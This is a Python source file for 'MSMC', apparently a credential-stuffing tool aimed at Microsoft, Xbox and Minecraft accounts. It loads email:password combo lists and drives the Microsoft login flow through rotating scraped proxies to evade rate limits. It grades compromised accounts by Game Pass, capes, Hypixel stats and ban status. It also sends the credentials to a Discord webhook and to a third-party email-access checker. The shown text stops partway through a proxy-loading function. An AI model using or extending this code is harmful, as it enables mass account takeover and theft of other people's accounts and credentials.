from __future__ import annotations

import concurrent.futures
import configparser
import contextlib
import ctypes
import io
import json
import os
import platform
import random
import re
import socket
import sys
import threading
import time
import traceback
import urllib3
import uuid
import warnings
from datetime import datetime, timezone
from io import StringIO
from urllib.parse import urlparse, parse_qs

import requests
import urllib3
from colorama import Fore, Style, init as colorama_init

try:
    import readchar
    HAS_READCHAR = True
except ImportError:
    HAS_READCHAR = False

try:
    import socks
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

try:
    import tkinter as tk
    from tkinter import filedialog
    HAS_TK = True
except Exception:
    HAS_TK = False

try:
    from minecraft.networking.connection import Connection
    from minecraft.authentication import AuthenticationToken, Profile
    from minecraft.networking.packets import clientbound
    HAS_PYCRAFT = True
except Exception:
    HAS_PYCRAFT = False



colorama_init(autoreset=False)
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

IS_WINDOWS = platform.system() == "Windows"
IS_LINUX   = platform.system() == "Linux"
IS_MAC     = platform.system() == "Darwin"


def set_console_title(title: str) -> None:
    """Cross-platform console title setter."""
    try:
        if IS_WINDOWS:
            ctypes.windll.kernel32.SetConsoleTitleW(str(title))
        else:
            sys.stdout.write(f"\033]0;{title}\007")
            sys.stdout.flush()
    except Exception:
        pass


def clear_console() -> None:
    """Cross-platform clear."""
    try:
        if IS_WINDOWS:
            os.system("cls")
        else:
            os.system("clear")
    except Exception:
        sys.stdout.write("\033[2J\033[H")
        sys.stdout.flush()



logo = Fore.GREEN + r'''
     ███▄ ▄███▓  ██████  ███▄ ▄███▓ ▄████▄
    ▓██▒▀█▀ ██▒▒██    ▒ ▓██▒▀█▀ ██▒▒██▀ ▀█
    ▓██    ▓██░░ ▓██▄   ▓██    ▓██░▒▓█    ▄
    ▒██    ▒██   ▒   ██▒▒██    ▒██ ▒▓▓▄ ▄██▒
    ▒██▒   ░██▒▒██████▒▒▒██▒   ░██▒▒ ▓███▀ ░
    ░ ▒░   ░  ░▒ ▒▓▒ ▒ ░░ ▒░   ░  ░░ ░▒ ▒  ░
    ░  ░      ░░ ░▒  ░ ░░  ░      ░  ░  ▒
    ░      ░   ░  ░  ░  ░      ░   ░
           ░         ░         ░   ░ ░
                                   ░
''' + Style.RESET_ALL

sFTTag_url = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

Combos: list[str] = []
proxylist: list = []
banproxies: list[str] = []
fname: str = ""

hits = bad = twofa = cpm = errors = retries = checked = 0
vm = sfa = mfa = maxretries = xgp = xgpu = other = 0

_socket_lock = threading.Lock()
_proxy_type = "'4'"
_screen = "'1'"

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
      "AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0")



class Config:
    def __init__(self) -> None:
        self.data: dict = {}

    def set(self, key, value) -> None:
        self.data[key] = value

    def get(self, key):
        return self.data.get(key)


config = Config()


def _str_to_bool(value) -> bool:
    return str(value).lower() in ("yes", "true", "t", "1", "on")


DEFAULT_CONFIG = {
    "Settings": {
        "Webhook": "paste your discord webhook here",
        "Max Retries": "5",
        "Proxyless Ban Check": "False",
        "WebhookMessage": (
            "@everyone HIT: ||`<email>:<password>`||\n"
            "Name: <name>\n"
            "Account Type: <type>\n"
            "Hypixel: <hypixel>\n"
            "Hypixel Level: <level>\n"
            "First Hypixel Login: <firstlogin>\n"
            "Last Hypixel Login: <lastlogin>\n"
            "Optifine Cape: <ofcape>\n"
            "MC Capes: <capes>\n"
            "Email Access: <access>\n"
            "Hypixel Skyblock Coins: <skyblockcoins>\n"
            "Hypixel Bedwars Stars: <bedwarsstars>\n"
            "Banned: <banned>\n"
            "Can Change Name: <namechange>\n"
            "Last Name Change: <lastchanged>"
        ),
    },
    "Scraper": {
        "Auto Scrape Minutes": "5",
    },
    "Captures": {
        "Hypixel Name": "True",
        "Hypixel Level": "True",
        "First Hypixel Login": "True",
        "Last Hypixel Login": "True",
        "Optifine Cape": "True",
        "Minecraft Capes": "True",
        "Email Access": "True",
        "Hypixel Skyblock Coins": "True",
        "Hypixel Bedwars Stars": "True",
        "Hypixel Ban": "True",
        "Name Change Availability": "True",
        "Last Name Change": "True",
    },
}


def loadconfig() -> None:
    """Load or create config.ini. Backward compatible with old keys."""
    global maxretries

    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        for section, opts in DEFAULT_CONFIG.items():
            c[section] = opts
        with open("config.ini", "w", encoding="utf-8") as f:
            c.write(f)

    rc = configparser.ConfigParser()
    rc.read("config.ini", encoding="utf-8")

    for section, opts in DEFAULT_CONFIG.items():
        if not rc.has_section(section):
            rc.add_section(section)
        for k, v in opts.items():
            if not rc.has_option(section, k):
                rc.set(section, k, str(v))
    with open("config.ini", "w", encoding="utf-8") as f:
        rc.write(f)

    try:
        maxretries = int(rc["Settings"]["Max Retries"])
    except Exception:
        maxretries = 5

    config.set("webhook",         rc["Settings"].get("Webhook", ""))
    config.set("message",         rc["Settings"].get("WebhookMessage", ""))
    config.set("proxylessban",    _str_to_bool(rc["Settings"].get("Proxyless Ban Check", "False")))
    config.set("autoscrape",      int(rc["Scraper"].get("Auto Scrape Minutes", "5")))

    config.set("hypixelname",     _str_to_bool(rc["Captures"].get("Hypixel Name", "True")))
    config.set("hypixellevel",    _str_to_bool(rc["Captures"].get("Hypixel Level", "True")))
    config.set("hypixelfirstlogin", _str_to_bool(rc["Captures"].get("First Hypixel Login", "True")))
    config.set("hypixellastlogin",  _str_to_bool(rc["Captures"].get("Last Hypixel Login", "True")))
    config.set("optifinecape",    _str_to_bool(rc["Captures"].get("Optifine Cape", "True")))
    config.set("mcapes",          _str_to_bool(rc["Captures"].get("Minecraft Capes", "True")))
    config.set("access",          _str_to_bool(rc["Captures"].get("Email Access", "True")))
    config.set("hypixelsbcoins",  _str_to_bool(rc["Captures"].get("Hypixel Skyblock Coins", "True")))
    config.set("hypixelbwstars",  _str_to_bool(rc["Captures"].get("Hypixel Bedwars Stars", "True")))
    config.set("hypixelban",      _str_to_bool(rc["Captures"].get("Hypixel Ban", "True")))
    config.set("namechange",      _str_to_bool(rc["Captures"].get("Name Change Availability", "True")))
    config.set("lastchanged",     _str_to_bool(rc["Captures"].get("Last Name Change", "True")))



def getproxy():
    """Return a requests-compatible proxies dict, or None."""
    if _proxy_type == "'4'":
        return None
    if not proxylist:
        return None
    if _proxy_type == "'5'":
        entry = random.choice(proxylist)
        return entry if isinstance(entry, dict) else None
    entry = random.choice(proxylist)
    return entry if isinstance(entry, dict) else None


def new_session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": UA})
    p = getproxy()
    if p:
        s.proxies.update(p)
    return s


def _proxies_for_raw(raw: str, kind: str):
    kind = kind.lower()
    if kind == "http":
        return {"http": f"http://{raw}", "https": f"http://{raw}"}
    if kind == "socks4":
        return {"http": f"socks4://{raw}", "https": f"socks4://{raw}"}
    if kind == "socks5":
        return {"http": f"socks5://{raw}", "https": f"socks5://{raw}"}
    return {"http": f"http://{raw}", "https": f"http://{raw}"}


def get_proxies() -> None:
    """Scrape free proxies, then re-schedule. Runs in background."""
    global proxylist
    http, socks4, socks5 = [], [], []

    http_sources = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt",
    ]
    socks4_sources = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt",
    ]
    socks5_sources = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt",
    ]

    for src in http_sources:
        try:
            http.extend(requests.get(src, timeout=20).text.splitlines())
        except Exception:
            pass
    for src in socks4_sources:
        try:
            socks4.extend(requests.get(src, timeout=20).text.splitlines())
        except Exception:
            pass
    for src in socks5_sources:
        try:
            socks5.extend(requests.get(src, timeout=20).text.splitlines())
        except Exception:
            pass

    try:
        for d in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500", timeout=20).json().get("data", []):
            socks4.append(f"{d.get('ip')}:{d.get('port')}")
    except Exception:
        pass
    try:
        for d in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500", timeout=20).json().get("data", []):
            socks5.append(f"{d.get('ip')}:{d.get('port')}")
    except Exception:
        pass

    http   = sorted(set(x for x in http   if x.strip()))
    socks4 = sorted(set(x for x in socks4 if x.strip()))
    socks5 = sorted(set(x for x in socks5 if x.strip()))

    new_list = []
    for p in http:
        new_list.append(_proxies_for_raw(p, "http"))
    for p in socks4:
        new_list.append(_proxies_for_raw(p, "socks4"))
    for p in socks5:
        new_list.append(_proxies_for_raw(p, "socks5"))

    proxylist.clear()
    proxylist.extend(new_list)

    if _screen == "'2'":
        print(Fore.LIGHTBLUE_EX + f"Scraped [{len(proxylist)}] proxies")

    time.sleep(max(1, config.get("autoscrape") or 5) * 60)
    get_proxies()



class Capture:
    def __init__(self, email, password, name, capes, uuid_, token, type_):
        self.email = email
        self.password = password
        self.name = name
        self.capes = capes
        self.uuid = uuid_
        self.token = token
        self.type = type_

        self.hypixl = None
        self.level = None
        self.firstlogin = None
        self.lastlogin = None
        self.cape = None
        self.access = None
        self.sbcoins = None
        self.bwstars = None
        self.banned = None
        self.namechanged = None
        self.lastchanged = None


    def builder(self) -> str:
        m = (f"Email: {self.email}\n"
             f"Password: {self.password}\n"
             f"Name: {self.name}\n"
             f"Capes: {self.capes}\n"
             f"Account Type: {self.type}")
        if self.hypixl      is not None: m += f"\nHypixel: {self.hypixl}"
        if self.level       is not None: m += f"\nHypixel Level: {self.level}"
        if self.firstlogin  is not None: m += f"\nFirst Hypixel Login: {self.firstlogin}"
        if self.lastlogin   is not None: m += f"\nLast Hypixel Login: {self.lastlogin}"
        if self.cape        is not None: m += f"\nOptifine Cape: {self.cape}"
        if self.access      is not None: m += f"\nEmail Access: {self.access}"
        if self.sbcoins     is not None: m += f"\nHypixel Skyblock Coins: {self.sbcoins}"
        if self.bwstars     is not None: m += f"\nHypixel Bedwars Stars: {self.bwstars}"
        if config.get("hypixelban") is True:
            m += f"\nHypixel Banned: {self.banned or 'Unknown'}"
        if self.namechanged is not None: m += f"\nCan Change Name: {self.namechanged}"
        if self.lastchanged is not None: m += f"\nLast Name Change: {self.lastchanged}"
        return m + "\n============================\n"

    def notify(self) -> None:
        try:
            wh = config.get("webhook") or ""
            if not wh or "paste your" in wh:
                return
            payload = {
                "content": (config.get("message") or "")
                    .replace("<email>",         self.email or "")
                    .replace("<password>",      self.password or "")
                    .replace("<name>",          self.name or "N/A")
                    .replace("<hypixel>",       self.hypixl or "N/A")
                    .replace("<level>",         self.level or "N/A")
                    .replace("<firstlogin>",    self.firstlogin or "N/A")
                    .replace("<lastlogin>",     self.lastlogin or "N/A")
                    .replace("<ofcape>",        self.cape or "N/A")
                    .replace("<capes>",         self.capes or "N/A")
                    .replace("<access>",        self.access or "N/A")
                    .replace("<skyblockcoins>", self.sbcoins or "N/A")
                    .replace("<bedwarsstars>",  self.bwstars or "N/A")
                    .replace("<banned>",        self.banned or "Unknown")
                    .replace("<namechange>",    self.namechanged or "N/A")
                    .replace("<lastchanged>",   self.lastchanged or "N/A")
                    .replace("<type>",          self.type or "N/A"),
                "username": "MSMC",
            }
            requests.post(wh, data=json.dumps(payload),
                          headers={"Content-Type": "application/json"}, timeout=15)
        except Exception:
            pass


    def hypixel(self) -> None:
        global errors
        try:
            want_stats = any([
                config.get("hypixelname"), config.get("hypixellevel"),
                config.get("hypixelfirstlogin"), config.get("hypixellastlogin"),
                config.get("hypixelbwstars"),
            ])
            if want_stats and self.name:
                r = requests.get(
                    f"https://plancke.io/hypixel/player/stats/{self.name}",
                    proxies=getproxy(), headers={"User-Agent": UA}, verify=False, timeout=15,
                )
                tx = r.text
                try:
                    if config.get("hypixelname"):
                        m = re.search(r'<meta property="og:description" content="(.+?)"', tx)
                        if m:
                            self.hypixl = m.group(1)
                except Exception: pass
                try:
                    if config.get("hypixellevel"):
                        m = re.search(r"Level:</b>\s*(.+?)\s*<br", tx)
                        if m: self.level = m.group(1).strip()
                except Exception: pass
                try:
                    if config.get("hypixelfirstlogin"):
                        m = re.search(r"First login:\s*</b>\s*(.+?)\s*<br", tx)
                        if m: self.firstlogin = m.group(1).strip()
                except Exception: pass
                try:
                    if config.get("hypixellastlogin"):
                        m = re.search(r"Last login:\s*</b>\s*(.+?)\s*<br", tx)
                        if m: self.lastlogin = m.group(1).strip()
                except Exception: pass
                try:
                    if config.get("hypixelbwstars"):
                        m = re.search(r"<li><b>Level:</b>\s*(.+?)\s*</li>", tx)
                        if m: self.bwstars = m.group(1).strip()
                except Exception: pass

            if config.get("hypixelsbcoins") and self.name:
                try:
                    r = requests.get(
                        f"https://sky.shiiyu.moe/stats/{self.name}",
                        proxies=getproxy(), headers={"User-Agent": UA},
                        verify=False, timeout=15,
                    )
                    m = re.search(r"Networth:\s*(.+?)\n", r.text)
                    if m: self.sbcoins = m.group(1).strip()
                except Exception:
                    pass
        except Exception:
            errors += 1

    def optifine(self) -> None:
        if not config.get("optifinecape"):
            return
        try:
            r = requests.get(f"http://s.optifine.net/capes/{self.name}.png",
                             proxies=getproxy(), verify=False, timeout=15)
            self.cape = "No" if "Not found" in r.text else "Yes"
        except Exception:
            self.cape = "Unknown"

    def full_access(self) -> None:
        global mfa, sfa
        if not config.get("access"):
            return
        try:
            out = requests.get(
                f"https://email.avine.tools/check?email={self.email}&password={self.password}",
                verify=False, timeout=15,
            ).json()
            if out.get("Success") == 1:
                self.access = "True"
                mfa += 1
                with open(f"results/{fname}/MFA.txt", "a", encoding="utf-8") as f:
                    f.write(f"{self.email}:{self.password}\n")
            else:
                sfa += 1
                self.access = "False"
                with open(f"results/{fname}/SFA.txt", "a", encoding="utf-8") as f:
                    f.write(f"{self.email}:{self.password}\n")
        except Exception:
            self.access = "Unknown"

    def namechange(self) -> None:
        if not (config.get("namechange") or config.get("lastchanged")):
            return
        tries = 0
        while tries < maxretries:
            try:
                r = requests.get(
                    "https://api.minecraftservices.com/minecraft/profile/namechange",
                    headers={"Authorization": f"Bearer {self.token}"},
                    proxies=getproxy(), verify=False, timeout=15,
                )
                if r.status_code == 200:
                    try:
                        data = r.json()
                        if config.get("namechange"):
                            self.namechanged = str(data.get("nameChangeAllowed", "N/A"))
                        if config.get("lastchanged"):
                            created_at = data.get("createdAt")
                            if created_at:
                                try:
                                    given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%S.%fZ")
                                except ValueError:
                                    given_date = datetime.strptime(created_at, "%Y-%m-%dT%H:%M:%SZ")
                                given_date = given_date.replace(tzinfo=timezone.utc)
                                formatted = given_date.strftime("%m/%d/%Y")
                                diff = datetime.now(timezone.utc) - given_date
                                years  = diff.days // 365
                                months = (diff.days % 365) // 30
                                days   = diff.days
                                if years > 0:
                                    self.lastchanged = f"{years} {'year' if years == 1 else 'years'} - {formatted} - {created_at}"
                                elif months > 0:
                                    self.lastchanged = f"{months} {'month' if months == 1 else 'months'} - {formatted} - {created_at}"
                                else:
                                    self.lastchanged = f"{days} {'day' if days == 1 else 'days'} - {formatted} - {created_at}"
                                break
                    except Exception:
                        pass
                if r.status_code == 429:
                    if len(proxylist) < 5:
                        time.sleep(20)
                    continue
            except Exception:
                pass
            tries += 1
            retries += 1


    def ban(self) -> None:
        global errors
        if not config.get("hypixelban"):
            return
        if not HAS_PYCRAFT:
            self.banned = "Unknown (pyCraft not installed)"
            return

        auth_token = AuthenticationToken(
            username=self.name,
            access_token=self.token,
            client_token=uuid.uuid4().hex,
        )
        auth_token.profile = Profile(id_=self.uuid, name=self.name)

        for attempt in range(maxretries):
            connection = Connection(
                "alpha.hypixel.net", 25565,
                auth_token=auth_token,
                initial_version=47,
                allowed_versions={"1.8", 47},
            )

            @connection.listener(clientbound.login.DisconnectPacket, early=True)
            def _on_disconnect(packet, _self=self):
                try:
                    data = json.loads(str(packet.json_data))
                except Exception:
                    _self.banned = "Unknown (bad packet)"
                    return
                s = str(data)
                try:
                    if "Suspicious activity" in s:
                        _self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {data['extra'][6]['text'].strip()}"
                        _write_ban(_self, True)
                    elif "temporarily banned" in s:
                        _self.banned = f"[{data['extra'][1]['text']}] {data['extra'][4]['text'].strip()} Ban ID: {data['extra'][8]['text'].strip()}"
                        _write_ban(_self, True)
                    elif "You are permanently banned from this server!" in s:
                        _self.banned = f"[Permanently] {data['extra'][2]['text'].strip()} Ban ID: {data['extra'][6]['text'].strip()}"
                        _write_ban(_self, True)
                    elif "The Hypixel Alpha server is currently closed!" in s:
                        _self.banned = "False"
                        _write_ban(_self, False)
                    elif "Failed cloning your SkyBlock data" in s:
                        _self.banned = "False"
                        _write_ban(_self, False)
                    else:
                        _self.banned = "".join(item.get("text", "") for item in data.get("extra", []))
                        _write_ban(_self, True)
                except Exception:
                    _self.banned = "Unknown"

            @connection.listener(clientbound.play.JoinGamePacket, early=True)
            def _on_join(packet, _self=self):
                if _self.banned is None:
                    _self.banned = "False"
                    _write_ban(_self, False)

            try:
                with _socket_lock:
                    original_socket = socket.socket
                    patched = False
                    if banproxies:
                        proxy = random.choice(banproxies)
                        if HAS_SOCKS:
                            if "@" in proxy:
                                auth, hostport = proxy.split("@", 1)
                                user, pw = auth.split(":", 1)
                                ip, port = hostport.split(":", 1)
                                socks.set_default_proxy(socks.SOCKS5, addr=ip, port=int(port),
                                                        username=user, password=pw)
                            else:
                                ip, port = proxy.split(":", 1)
                                socks.set_default_proxy(socks.SOCKS5, addr=ip, port=int(port))
                            socket.socket = socks.socksocket
                            patched = True

                    err_sink = StringIO()
                    try:
                        with contextlib.redirect_stderr(err_sink):
                            connection.connect()
                            waited = 0.0
                            while self.banned is None and waited < 10.0:
                                time.sleep(0.05)
                                waited += 0.05
                            try:
                                connection.disconnect()
                            except Exception:
                                pass
                    finally:
                        if patched:
                            socket.socket = original_socket
                            if HAS_SOCKS:
                                try:
                                    socks.set_default_proxy()
                                except Exception:
                                    pass
            except Exception:
                errors += 1

            if self.banned is not None:
                break
            retries += 1


    def handle(self) -> None:
        global hits
        hits += 1
        if _screen == "'2'":
            print(Fore.GREEN + f"Hit: {self.name} | {self.email}:{self.password}")
        with open(f"results/{fname}/Hits.txt", "a", encoding="utf-8") as f:
            f.write(f"{self.email}:{self.password}\n")

        if self.name and self.name != "N/A":
            for fn in (self.hypixel, self.optifine, self.full_access, self.namechange, self.ban):
                try:
                    fn()
                except Exception:
                    pass

        with open(f"results/{fname}/Capture.txt", "a", encoding="utf-8") as f:
            f.write(self.builder())
        self.notify()


def _write_ban(cap: Capture, banned: bool) -> None:
    path = f"results/{fname}/{'Banned' if banned else 'Unbanned'}.txt"
    try:
        with open(path, "a", encoding="utf-8") as f:
            f.write(f"{cap.email}:{cap.password}\n")
    except Exception:
        pass



def get_urlPost_sFTTag(session: requests.Session):
    global retries
    tries = 0
    while tries < maxretries:
        try:
            text = session.get(sFTTag_url, timeout=15).text
            m = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if m:
                sFTTag = m.group(1)
                m2 = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if m2:
                    return m2.group(1), sFTTag, session
        except Exception:
            pass
        new_proxy = getproxy()
        if new_proxy:
            session.proxies.update(new_proxy)
        retries += 1
        tries += 1
    return None, None, session


def get_xbox_rps(session: requests.Session, email, password, urlPost, sFTTag):
    global bad, checked, cpm, twofa, retries
    tries = 0
    while tries < maxretries:
        try:
            data = {"login": email, "loginfmt": email, "passwd": password, "PPFT": sFTTag}
            r = session.post(urlPost, data=data,
                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                             allow_redirects=True, timeout=15)

            if "#" in r.url and r.url != sFTTag_url:
                tok = parse_qs(urlparse(r.url).fragment).get("access_token", ["None"])[0]
                if tok != "None":
                    return tok, session

            elif "cancel?mkt=" in r.text:
                try:
                    data = {
                        "ipt":   re.search(r'(?<="ipt" value=").+?(?=">)', r.text).group(),
                        "pprid": re.search(r'(?<="pprid" value=").+?(?=">)', r.text).group(),
                        "uaid":  re.search(r'(?<="uaid" value=").+?(?=">)', r.text).group(),
                    }
                    action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r.text).group()
                    ret = session.post(action, data=data, allow_redirects=True, timeout=15)
                    fin = session.get(
                        re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text).group(),
                        allow_redirects=True, timeout=15,
                    )
                    tok = parse_qs(urlparse(fin.url).fragment).get("access_token", ["None"])[0]
                    if tok != "None":
                        return tok, session
                except Exception:
                    pass

            elif any(x in r.text for x in [
                "recover?mkt", "account.live.com/identity/confirm?mkt",
                "Email/Confirm?mkt", "/Abuse?mkt=",
            ]):
                twofa += 1; checked += 1; cpm += 1
                if _screen == "'2'":
                    print(Fore.MAGENTA + f"2FA: {email}:{password}")
                with open(f"results/{fname}/2fa.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
                return "None", session

            elif any(x in r.text.lower() for x in [
                "password is incorrect", "account doesn't exist.",
                "sign in to your microsoft account",
                "tried to sign in too many times with an incorrect account or password",
            ]):
                bad += 1; checked += 1; cpm += 1
                if _screen == "'2'":
                    print(Fore.RED + f"Bad: {email}:{password}")
                return "None", session

            else:
                p = getproxy()
                if p:
                    session.proxies.update(p)
                retries += 1
                tries += 1
        except Exception:
            p = getproxy()
            if p:
                session.proxies.update(p)
            retries += 1
            tries += 1

    bad += 1; checked += 1; cpm += 1
    if _screen == "'2'":
        print(Fore.RED + f"Bad: {email}:{password}")
    return "None", session


def mc_token(session: requests.Session, uhs, xsts_token):
    global retries
    tries = 0
    while tries < maxretries:
        try:
            r = session.post(
                "https://api.minecraftservices.com/authentication/login_with_xbox",
                json={"identityToken": f"XBL3.0 x={uhs};{xsts_token}"},
                headers={"Content-Type": "application/json"}, timeout=15,
            )
            if r.status_code == 429:
                p = getproxy()
                if p:
                    session.proxies.update(p)
                if len(proxylist) < 1:
                    time.sleep(20)
                tries += 1
                retries += 1
                continue
            return r.json().get("access_token")
        except Exception:
            retries += 1
            tries += 1
            p = getproxy()
            if p:
                session.proxies.update(p)
    return None


def capture_mc(access_token, session, email, password, type_):
    global retries
    tries = 0
    while tries < maxretries:
        try:
            r = session.get(
                "https://api.minecraftservices.com/minecraft/profile",
                headers={"Authorization": f"Bearer {access_token}"},
                verify=False, timeout=15,
            )
            if r.status_code == 200:
                j = r.json()
                capes = ", ".join(c.get("alias", "") for c in j.get("capes", []))
                cap = Capture(email, password, j.get("name", "N/A"),
                              capes, j.get("id", "N/A"), access_token, type_)
                cap.handle()
                return
            elif r.status_code == 429:
                p = getproxy()
                if p:
                    session.proxies.update(p)
                if len(proxylist) < 5:
                    time.sleep(20)
                tries += 1
                retries += 1
                continue
            else:
                return
        except Exception:
            retries += 1
            tries += 1
            p = getproxy()
            if p:
                session.proxies.update(p)


def checkmc(session, email, password, token):
    global retries, cpm, checked, xgp, xgpu, other
    tries = 0
    while tries < maxretries:
        try:
            r = session.get(
                "https://api.minecraftservices.com/entitlements/mcstore",
                headers={"Authorization": f"Bearer {token}"},
                verify=False, timeout=15,
            )
        except Exception:
            retries += 1
            tries += 1
            p = getproxy()
            if p:
                session.proxies.update(p)
            continue

        if r.status_code == 200:
            t = r.text
            if "product_game_pass_ultimate" in t:
                xgpu += 1; cpm += 1; checked += 1
                if _screen == "'2'":
                    print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass Ultimate: {email}:{password}")
                with open(f"results/{fname}/XboxGamePassUltimate.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
                try:
                    capture_mc(token, session, email, password, "Xbox Game Pass Ultimate")
                except Exception:
                    Capture(email, password, "N/A", "N/A", "N/A", "N/A",
                            "Xbox Game Pass Ultimate [Unset MC]").handle()
                return True

            elif "product_game_pass_pc" in t:
                xgp += 1; cpm += 1; checked += 1
                if _screen == "'2'":
                    print(Fore.LIGHTGREEN_EX + f"Xbox Game Pass: {email}:{password}")
                with open(f"results/{fname}/XboxGamePass.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email}:{password}\n")
                capture_mc(token, session, email, password, "Xbox Game Pass")
                return True

            elif '"product_minecraft"' in t:
                cpm += 1; checked += 1
                capture_mc(token, session, email, password, "Normal")
                return True

            else:
                extras = []
                if "product_minecraft_bedrock" in t: extras.append("Minecraft Bedrock")
                if "product_legends"          in t: extras.append("Minecraft Legends")
                if "product_dungeons"         in t: extras.append("Minecraft Dungeons")
                if extras:
                    other += 1; cpm += 1; checked += 1
                    joined = ", ".join(extras)
                    with open(f"results/{fname}/Other.txt", "a", encoding="utf-8") as f:
                        f.write(f"{email}:{password} | {joined}\n")
                    if _screen == "'2'":
                        print(Fore.YELLOW + f"Other: {email}:{password} | {joined}")
                    return True
                return False

        elif r.status_code == 429:
            p = getproxy()
            if p:
                session.proxies.update(p)
            if len(proxylist) < 1:
                time.sleep(20)
            retries += 1
            tries += 1
            continue

        else:
            return None

    return None


def validmail(email, password):
    global vm, cpm, checked
    vm += 1; cpm += 1; checked += 1
    with open(f"results/{fname}/Valid_Mail.txt", "a", encoding="utf-8") as f:
        f.write(f"{email}:{password}\n")
    if _screen == "'2'":
        print(Fore.LIGHTMAGENTA_EX + f"Valid Mail: {email}:{password}")


def authenticate(email, password):
    global retries, bad, checked, cpm
    session = new_session()
    try:
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        if not urlPost:
            bad += 1; checked += 1; cpm += 1
            if _screen == "'2'":
                print(Fore.RED + f"Bad: {email}:{password}")
            return

        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token == "None":
            return

        access_token = None
        try:
            xbl = session.post(
                "https://user.auth.xboxlive.com/user/authenticate",
                json={
                    "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com",
                                   "RpsTicket": token},
                    "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT",
                },
                headers={"Content-Type": "application/json", "Accept": "application/json"},
                timeout=15,
            ).json()
            xbox_token = xbl.get("Token")
            uhs = None
            if xbox_token:
                try:
                    uhs = xbl["DisplayClaims"]["xui"][0]["uhs"]
                except Exception:
                    uhs = None

            if xbox_token and uhs:
                xsts = session.post(
                    "https://xsts.auth.xboxlive.com/xsts/authorize",
                    json={
                        "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                        "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT",
                    },
                    headers={"Content-Type": "application/json", "Accept": "application/json"},
                    timeout=15,
                ).json()
                xsts_token = xsts.get("Token")
                if xsts_token:
                    access_token = mc_token(session, uhs, xsts_token)
        except Exception:
            access_token = None

        if access_token:
            result = checkmc(session, email, password, access_token)
            if result is False:
                validmail(email, password)
    finally:
        try:
            session.close()
        except Exception:
            pass



def _pick_file(title: str, fallback_prompt: str):
    """Return path string or None."""
    if HAS_TK:
        try:
            root = tk.Tk()
            root.withdraw()
            path = filedialog.askopenfilename(title=title,
                                              filetypes=[("Text", "*.txt"), ("All", "*.*")])
            root.destroy()
            return path or None
        except Exception:
            pass
    try:
        p = input(f"{fallback_prompt} (path): ").strip().strip('"').strip("'")
        if p and os.path.isfile(p):
            return p
        print(Fore.LIGHTRED_EX + "Invalid file.")
    except Exception:
        pass
    return None


def Load() -> None:
    global Combos, fname
    while True:
        path = _pick_file("Choose a Combo file", "Combo file")
        if not path:
            print(Fore.LIGHTRED_EX + "Invalid File.")
            time.sleep(1)
            continue
        fname = os.path.splitext(os.path.basename(path))[0]
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            Combos = list(set(lines))
            print(Fore.LIGHTBLUE_EX + f"[{len(lines) - len(Combos)}] Dupes Removed.")
            print(Fore.LIGHTBLUE_EX + f"[{len(Combos)}] Combos Loaded.")
            return
        except Exception:
            print(Fore.LIGHTRED_EX + "Your file is probably harmed.")
            time.sleep(1)


def Proxys() -> None:
    global proxylist
    while True:
        path = _pick_file("Choose a Proxy file", "Proxy file")
        if not path:
            print(Fore.LIGHTRED_EX + "Invalid File.")
            time.sleep(1)
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                ext = f.readlines()
            new_list = []
            for line in ext:
                raw = line.split()[0].strip() if line.split() else ""
                if not raw:
                    continue
                kind = {"'1'": "http", "'2'": "socks4", "'3'": "socks5", "'4'": "http"}.get(_proxy_type, "http")
                new_list.append(_proxies_for_raw(raw, kind))
            proxylist.clear()
            proxylist.extend(new_list)
            print(Fore.LIGHTBLUE_EX + f"Loaded [{len(proxylist)}] lines.")
            time.sleep(1)
            return
        except Exception:
            print(Fore.LIGHTRED_EX + "Your file is probably harmed.")
            time.sleep(1)


def banproxyload() -> None:
    global banproxies
    while True:
        path = _pick_file("Choose a SOCKS5 Proxy file", "SOCKS5 proxy file")
        if not path:
            print(Fore.LIGHTRED_EX + "Invalid File.")
            time.sleep(1)
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                ext = f.readlines()
